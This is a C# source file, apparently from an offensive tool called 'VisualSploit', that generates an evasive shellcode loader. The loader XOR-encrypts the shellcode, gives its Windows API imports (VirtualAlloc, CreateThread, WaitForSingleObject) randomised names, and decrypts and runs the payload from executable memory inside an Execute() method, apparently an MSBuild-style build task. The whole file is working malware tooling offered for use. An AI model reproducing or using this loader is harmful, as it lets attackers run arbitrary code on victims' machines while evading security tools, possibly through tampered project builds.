namespace VisualSploit;

internal static class Loader
{
    public static string Generate(byte[] shellcode, Config cfg, Naming naming)
    {
        var alloc = naming.Next();
        var spawn = naming.Next();
        var wait = naming.Next();
        var buf = naming.Next();
        var page = naming.Next();
        var thread = naming.Next();

        var (data, keys) = Xor.Encrypt(shellcode, cfg.XorRounds, cfg.Seed.HasValue ? naming.Rng : null);
        var decrypt = Indent(Xor.Routine(buf, data, keys), "    ");

        return $$"""
        [System.Runtime.InteropServices.DllImport("kernel32", EntryPoint = "VirtualAlloc")]
        static extern System.IntPtr {{alloc}}(System.IntPtr a, uint s, uint t, uint p);

        [System.Runtime.InteropServices.DllImport("kernel32", EntryPoint = "CreateThread")]
        static extern System.IntPtr {{spawn}}(System.IntPtr a, uint s, System.IntPtr start, System.IntPtr p, uint f, System.IntPtr t);

        [System.Runtime.InteropServices.DllImport("kernel32", EntryPoint = "WaitForSingleObject")]
        static extern uint {{wait}}(System.IntPtr h, uint ms);

        public override bool Execute()
        {
        {{decrypt}}
            var {{page}} = {{alloc}}(System.IntPtr.Zero, (uint){{buf}}.Length, 0x1000u, 0x40u);
            System.Runtime.InteropServices.Marshal.Copy({{buf}}, 0, {{page}}, {{buf}}.Length);
            var {{thread}} = {{spawn}}(System.IntPtr.Zero, 0u, {{page}}, System.IntPtr.Zero, 0u, System.IntPtr.Zero);
            {{wait}}({{thread}}, 0xFFFFFFFFu);
            return true;
        }
        """;
    }

    static string Indent(string text, string indent) =>
        string.IsNullOrEmpty(text) ? "" :
        string.Join("\n",
            text.ReplaceLineEndings("\n").TrimEnd('\n').Split('\n')
                .Select(l => l.Length == 0 ? l : indent + l)) + "\n";
}
